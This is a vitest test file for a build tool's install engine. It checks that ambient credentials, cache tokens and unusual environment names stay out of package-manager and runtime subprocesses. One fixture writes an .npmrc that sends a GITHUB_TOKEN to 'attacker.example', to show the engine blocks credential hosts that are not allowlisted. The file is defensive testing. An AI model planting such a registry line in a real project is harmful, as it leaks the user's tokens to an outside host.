import * as PackageManager from "@smthrs/build/PackageManager"
import * as Runtime from "@smthrs/build/Runtime"
import * as TargetRuntime from "@smthrs/targets/Runtime"
import * as Effect from "effect/Effect"
import { chmod, mkdtemp, readFile, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { describe, expect, it } from "vitest"
import {
  declaredToolchain,
  layerNonInteractiveNodeServices,
  layerPackageManager,
  layerRuntime,
  packageManagerEnvironment,
  runInstall,
  targetToolchain
} from "../src/engine.ts"

describe("install engine boundary", () => {
  it.skipIf(process.platform === "win32")(
    "withholds ambient credentials from a production runtime probe",
    async () => {
      const root = await mkdtemp(join(tmpdir(), "smithers-runtime-probe-"))
      const executable = join(root, "runtime-probe.mjs")
      const observed = join(root, "observed.json")
      await writeFile(
        executable,
        `#!/usr/bin/env node\n` +
          `import { writeFileSync } from "node:fs"\n` +
          `writeFileSync(${JSON.stringify(observed)}, JSON.stringify(process.env.RUNTIME_PROBE_SECRET ?? null))\n` +
          `process.stdout.write("1.0.0\\n")\n`
      )
      await chmod(executable, 0o755)
      process.env.RUNTIME_PROBE_SECRET = "must-not-cross"
      try {
        const toolchain = {
          manager: "pnpm" as const,
          managerVersion: ">=0.0.0",
          managerExecutable: undefined,
          runtime: "node" as const,
          runtimeVersion: "1.0.0",
          runtimeExecutable: executable
        }
        const version = await Effect.runPromise(
          Effect.flatMap(Runtime.Runtime, (runtime) => runtime.version).pipe(
            Effect.provide(layerRuntime(toolchain)),
            Effect.provide(layerNonInteractiveNodeServices)
          )
        )
        expect(version).toBe("1.0.0")
        expect(JSON.parse(await readFile(observed, "utf8"))).toBeNull()
      } finally {
        delete process.env.RUNTIME_PROBE_SECRET
        await rm(root, { force: true, recursive: true })
      }
    }
  )

  /**
   * A project `.npmrc` names the host its credential goes to. The operator's
   * `SMITHERS_NPM_CREDENTIAL_HOSTS`, never the checkout, decides which hosts
   * may receive one.
   */
  it.skipIf(process.platform === "win32")(
    "binds .npmrc credentials only to operator-allowed registry hosts",
    async () => {
      const root = await mkdtemp(join(tmpdir(), "smithers-credential-hosts-"))
      try {
        await writeFile(
          join(root, ".npmrc"),
          "registry=https://attacker.example/\n//attacker.example/:_authToken=${GITHUB_TOKEN}\n"
        )
        const executable = join(root, "pnpm-probe.mjs")
        const observed = join(root, "observed")
        await writeFile(
          executable,
          `#!/usr/bin/env node\nimport { writeFileSync } from "node:fs"\n` +
            `writeFileSync(${JSON.stringify(observed)}, String(process.env.GITHUB_TOKEN))\n` +
            `process.stdout.write("11.21.0\\n")\n`
        )
        await chmod(executable, 0o755)
        const toolchain = {
          manager: "pnpm" as const,
          managerVersion: ">=0.0.0",
          managerExecutable: executable,
          runtime: "node" as const,
          runtimeVersion: ">=0.0.0",
          runtimeExecutable: undefined
        }
        const versionWith = (extra: Record<string, string>) =>
          Effect.runPromise(
            Effect.flatMap(PackageManager.PackageManager, (manager) => manager.version).pipe(
              Effect.provide(
                layerPackageManager(root, toolchain, [], {
                  PATH: process.env.PATH,
                  GITHUB_TOKEN: "host-secret",
                  ...extra
                })
              ),
              Effect.provide(layerNonInteractiveNodeServices)
            )
          )
        await expect(versionWith({})).rejects.toThrow(/outside credentialHosts/)
        await expect(readFile(observed, "utf8")).rejects.toMatchObject({ code: "ENOENT" })
        await versionWith({ SMITHERS_NPM_CREDENTIAL_HOSTS: "registry.npmjs.org, attacker.example" })
        expect(await readFile(observed, "utf8")).toBe("host-secret")
      } finally {
        await rm(root, { force: true, recursive: true })
      }
    }
  )

  it("withholds default and workspace-declared cache credentials from package managers", () => {
    const environment = packageManagerEnvironment(
      {
        PATH: "/bin",
        SMITHERS_CACHE_URL: "https://cache.example.test",
        SMITHERS_CACHE_TOKEN: "default-secret",
        WORKSPACE_CACHE_SECRET: "custom-secret"
      },
      ["WORKSPACE_CACHE_SECRET"],
      false
    )

    expect(environment).toEqual({ PATH: "/bin" })
    expect(Object.isFrozen(environment)).toBe(true)
  })

  it("matches environment names case-insensitively on Windows", () => {
    const environment = packageManagerEnvironment(
      {
        Path: "C:\\Windows",
        smithers_cache_token: "secret",
        Custom_Token: "custom"
      },
      ["CUSTOM_TOKEN"],
      true
    )

    expect(environment).toEqual({ Path: "C:\\Windows" })
  })

  /**
   * `layerPackageManager` hands this function the real `process.env`. A Windows
   * runner's environment carries names the POSIX convention never produces:
   * `ProgramFiles(x86)` and `CommonProgramFiles(x86)` are set by Windows itself
   * on every 64-bit image. Refusing the whole environment because the operating
   * system named a variable the way it always has is a build that cannot run.
   */
  it("forwards the environment a Windows host sets for itself", () => {
    const environment = packageManagerEnvironment(
      {
        Path: "C:\\Windows",
        "ProgramFiles(x86)": "C:\\Program Files (x86)",
        "CommonProgramFiles(x86)": "C:\\Program Files (x86)\\Common Files",
        SMITHERS_CACHE_TOKEN: "secret"
      },
      [],
      true
    )

    expect(environment).toEqual({
      Path: "C:\\Windows",
      "ProgramFiles(x86)": "C:\\Program Files (x86)",
      "CommonProgramFiles(x86)": "C:\\Program Files (x86)\\Common Files"
    })
  })

  /**
   * Windows still has a name rule, and it is the environment block's own: a
   * name is non-empty and carries no `=`, because `NAME=VALUE` is the block's
   * only separator. A name the block cannot represent would be mangled by the
   * spawn rather than passed, so it fails here instead.
   */
  it("refuses a name a Windows environment block cannot carry", () => {
    expect(() => packageManagerEnvironment({ "A=B": "x" }, [], true)).toThrow(/non-portable name/)
    expect(() => packageManagerEnvironment({ "": "x" }, [], true)).toThrow(/non-portable name/)
    expect(() => packageManagerEnvironment({ "A\u0007B": "x" }, [], true)).toThrow(/non-portable name/)
  })

  /**
   * A POSIX host carries names the `export NAME=` convention never produces:
   * bash exports shell functions as `BASH_FUNC_which%%`, and every host running
   * environment-modules adds more. Every child inherits them, so refusing the
   * copy failed every target on such a host before anything ran. The
   * package-manager layer selects from its own allowlist, so a dropped name
   * could never have reached a child; the copy skips it and keeps going.
   */
  it("skips a name outside the POSIX convention instead of refusing the copy", () => {
    expect(packageManagerEnvironment(
      {
        PATH: "/usr/bin",
        "BASH_FUNC_which%%": "() {  declare -f which\n}",
        "ProgramFiles(x86)": "x",
        SMITHERS_CACHE_TOKEN: "secret"
      },
      [],
      false
    )).toEqual({ PATH: "/usr/bin" })
  })

  /** A Windows name the environment block cannot carry names itself in the refusal. */
  it("names the offending environment variable", () => {
    expect(() => packageManagerEnvironment({ "A=B": "x" }, [], true)).toThrow(/non-portable name: "A=B"/)
  })

  it("rejects malformed sensitive-name declarations", () => {
    expect(() => packageManagerEnvironment({}, ["BAD-NAME"])).toThrow("invalid environment name")
    expect(() => packageManagerEnvironment({}, Array.from({ length: 65 }, () => "TOKEN")))
      .toThrow("at most 64")
  })

  /**
   * The copy is bounded before it is carried into a spawn: at most 4096
   * entries, counted over the source's own keys, so a corrupt source cannot
   * make the sanitizer walk an unbounded one.
   */
  it("carries the largest entry count it admits and refuses the next one", () => {
    const source = (count: number) => Object.fromEntries(Array.from({ length: count }, (_, index) => [`V${index}`, ""]))
    expect(Object.keys(packageManagerEnvironment(source(4_096), [], false))).toHaveLength(4_096)
    expect(() => packageManagerEnvironment(source(4_097), [], false))
      .toThrow(/more than 4096 entries/)
  })

  /** Names and values together are bounded at 262144 bytes, counted as UTF-8. */
  it("carries an environment at the byte ceiling and refuses one byte more", () => {
    const ceiling = 256 * 1024
    const value = (bytes: number) => "x".repeat(bytes - "BIG".length)
    expect(packageManagerEnvironment({ BIG: value(ceiling) }, [], false))
      .toEqual({ BIG: value(ceiling) })
    expect(() => packageManagerEnvironment({ BIG: value(ceiling + 1) }, [], false))
      .toThrow(/exceeds 262144 bytes/)
  })

  it("rejects hostile environment shapes without invoking accessors", () => {
    let reads = 0
    const source = Object.defineProperty({ PATH: "/bin" }, "SECRET", {
      enumerable: true,
      get: () => {
        reads += 1
        return "secret"
      }
    })
    expect(() => packageManagerEnvironment(source)).toThrow(/must be an enumerable data property/)
    expect(reads).toBe(0)
    expect(() => packageManagerEnvironment({ PATH: "/bin", Path: "/other" }, [], true)).toThrow(
      /repeats a case-insensitive name/
    )
    expect(() => packageManagerEnvironment({ TOKEN: 42 } as never)).toThrow(/string or undefined/)
  })

  it("snapshots the supplied environment", () => {
    const source = { PATH: "/first" }
    const environment = packageManagerEnvironment(source)
    source.PATH = "/second"
    expect(environment).toEqual({ PATH: "/first" })
  })

  it("refuses a cache directory that disagrees with the install Flow boundary", async () => {
    await expect(runInstall("/path/need/not/exist", { cacheDirectory: "custom-cache" }))
      .rejects.toThrow(/declared store boundary/)
  })

  it("validates install options before touching the workspace", async () => {
    let reads = 0
    const accessor = Object.defineProperty({}, "cacheDirectory", {
      enumerable: true,
      get: () => {
        reads += 1
        return ".flows"
      }
    })
    await expect(runInstall("/path/need/not/exist", accessor)).rejects.toThrow(/data property/)
    expect(reads).toBe(0)
    await expect(runInstall("/path/need/not/exist", { typo: true } as never)).rejects.toThrow(
      /unknown property/
    )
    await expect(runInstall("/path/need/not/exist", { signal: {} as AbortSignal })).rejects.toThrow(
      /must be an AbortSignal/
    )
  })
})

describe("target tool selection boundary", () => {
  it("provides a runtime-only declaration to the same service the target verifies", () => {
    const runtime = TargetRuntime.ResolvedNodeRuntime.make({ name: "node", version: "24.11.0", executable: "./node" })
    expect(declaredToolchain({ runtime })).toMatchObject({
      runtime: "node",
      runtimeVersion: "24.11.0",
      runtimeExecutable: "./node"
    })
  })

  it("does not turn an absent or malformed tool declaration into a host requirement", () => {
    for (const attrs of [undefined, null, {}, { runtime: { name: "node" } }, { packageManager: { name: "pnpm" } }]) {
      expect(targetToolchain("NodeBinary", attrs)).toEqual({ runtime: undefined, packageManager: undefined })
    }
  })

  it("does not invoke getters or Proxy traps while selecting declared tools", () => {
    let reads = 0
    const attrs = Object.defineProperty({}, "runtime", {
      get: () => {
        reads += 1
        throw new Error("getter invoked")
      }
    })
    const proxy = new Proxy({}, {
      getOwnPropertyDescriptor: () => {
        reads += 1
        throw new Error("proxy invoked")
      }
    })
    for (const value of [attrs, proxy, { runtime: proxy }, { packageManager: proxy }]) {
      expect(targetToolchain("NodeBinary", value)).toEqual({ runtime: undefined, packageManager: undefined })
    }
    expect(reads).toBe(0)
  })

  it("does not inspect rendering-only generators' toolchain data", () => {
    const attrs = new Proxy({}, {
      getOwnPropertyDescriptor: () => {
        throw new Error("not an execution capability")
      }
    })
    for (const kind of ["GithubCiGen", "PnpmWorkspace"]) {
      expect(targetToolchain(kind, attrs)).toEqual({ runtime: undefined, packageManager: undefined })
    }
  })
})

describe("runInstall option normalization", () => {
  const toolchain = {
    manager: "bun" as const,
    managerVersion: "1.4.1",
    managerExecutable: undefined,
    runtime: "bun" as const,
    runtimeVersion: "1.4.1",
    runtimeExecutable: undefined
  }

  /**
   * `runInstall` documented a `toolchain` option and read it, but the option
   * normalizer's allowlist did not carry the name, so every call passing one
   * threw `unknown property: toolchain` and the non-default branch was
   * unreachable.
   */
  it("accepts the documented toolchain option", async () => {
    // Normalization must let it through; the call then fails on the workspace
    // path, which is what proves it got past the allowlist.
    const pnpm = { ...toolchain, manager: "pnpm" as const, managerVersion: "11.25.0", runtime: "node" as const }
    await expect(runInstall("/path/need/not/exist", { toolchain: pnpm })).rejects.toThrow(/ENOENT/)
  })

  it("refuses a Bun toolchain as unsupported before touching the workspace", async () => {
    const refusal = await runInstall("/path/need/not/exist", { toolchain }).then(
      () => undefined,
      (cause: unknown) => cause
    )
    expect(refusal).toBeInstanceOf(PackageManager.PackageManagerError)
    expect((refusal as PackageManager.PackageManagerError).code).toBe("unsupported")
    expect((refusal as PackageManager.PackageManagerError).message).toContain(
      "Install cannot use the Bun package manager"
    )
  })

  /**
   * Accepting the option is only half of it. `Cli.ts` reads the workspace
   * declaration and hands it here so the local `install` runs the manager the
   * workspace names, and nothing pinned that the declared manager is the one
   * the layer actually builds: `install` used to pin `defaultToolchain` while
   * the generated CI workflow used the declaration, so the two could disagree
   * about the package manager.
   */
  it("builds the layer for the declared non-default manager", async () => {
    const root = await mkdtemp(join(tmpdir(), "smithers-declared-manager-"))
    const nameOf = (declared: typeof toolchain | undefined): Promise<string> =>
      Effect.runPromise(
        Effect.map(PackageManager.PackageManager, (manager) => manager.name).pipe(
          Effect.provide(
            declared === undefined ? layerPackageManager(root) : layerPackageManager(root, declared)
          ),
          Effect.provide(layerNonInteractiveNodeServices)
        )
      )
    try {
      expect(await nameOf(toolchain)).toBe("bun")
      // Omitting the declaration still pins the default, which is what made the
      // two disagree: `install` ran pnpm while the generated workflow ran bun.
      expect(await nameOf(undefined)).toBe("pnpm")
    } finally {
      await rm(root, { force: true, recursive: true })
    }
  })

  it("rejects a toolchain whose fields are accessors", async () => {
    let reads = 0
    const hostile = Object.defineProperty({ ...toolchain }, "manager", {
      enumerable: true,
      get: () => {
        reads += 1
        return "bun"
      }
    })
    await expect(runInstall("/path/need/not/exist", { toolchain: hostile as never }))
      .rejects.toThrow(/install toolchain must be a plain object/)
    expect(reads).toBe(0)
  })

  it("rejects a toolchain naming a package manager that does not exist", async () => {
    await expect(runInstall("/path/need/not/exist", { toolchain: { ...toolchain, manager: "yarn" } as never }))
      .rejects.toThrow(/is not a package manager/)
  })

  it("still rejects an unknown option", async () => {
    await expect(runInstall("/path/need/not/exist", { nope: 1 } as never))
      .rejects.toThrow(/unknown property: nope/)
  })
})
